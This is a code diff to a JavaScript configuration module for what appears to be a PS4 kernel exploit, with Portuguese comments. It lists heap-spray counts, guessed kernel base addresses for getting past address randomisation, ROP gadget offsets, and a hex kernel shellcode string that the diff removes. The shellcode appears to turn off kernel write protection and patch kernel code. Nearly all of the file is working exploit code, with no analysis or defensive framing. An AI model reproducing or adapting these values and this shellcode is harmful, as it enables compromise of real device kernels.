@@ -1,28 +1,24 @@
-// CONFIGURAÇÃO LIMPA (SEM BASE ÚNICA)
 export const CONFIG = {
-    // Limite Crítico (Descoberto no seu teste)
+    // Limite de segurança (Worker 406 travou no seu teste anterior)
     WORKER_LIMIT: 406,
     
-    // Quantidade massiva para cobrir a memória
+    // Quantidade de sprays (25 mil cópias para garantir o Rainbow)
     SPRAY_QUANTITY: 25000,
 
-    // BASES PROVÁVEIS (ASLR Bypass via Estatística)
-    // O Kernel do PS4 tende a carregar em endereços alinhados a 0x4000 ou 0x10000.
-    // Vamos testar os "hotspots" mais comuns.
+    // As 16 bases mais prováveis do ASLR no PS4
     TARGET_BASES: [
-        0x800000000n, 0x800004000n, 0x800010000n, // Baixos
+        0x800000000n, 0x800004000n, 0x800010000n, 
         0x800400000n, 0x800800000n, 0x801000000n,
-        0x820000000n, 0x820004000n, 0x820010000n, // Médios (Seu Golden!)
+        0x820000000n, 0x820004000n, 0x820010000n, // O seu "Golden" está aqui
         0x880000000n, 0x880004000n, 0x880010000n,
-        0x900000000n, 0x920000000n, 0x940000000n, // Altos
-        0x200000000n  // Mapping alternativo
+        0x900000000n, 0x920000000n, 0x940000000n, 
+        0x200000000n
     ]
 };
-//Mantenha os GADGETS e SHELLCODE iguais...
+
 export const GADGETS = {
     pop_rdi: 0x2FEB5n,
-    pop_rsi: 0x2B89Fn,
     sys_mmap: 0x7500n,
-    jmp_rsi: 0x47b31n
+    jmp_rsi: 0x47b31n,
+    kl_lock: 0xE6C20n
 };
-export const SHELLCODE_HEX = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";
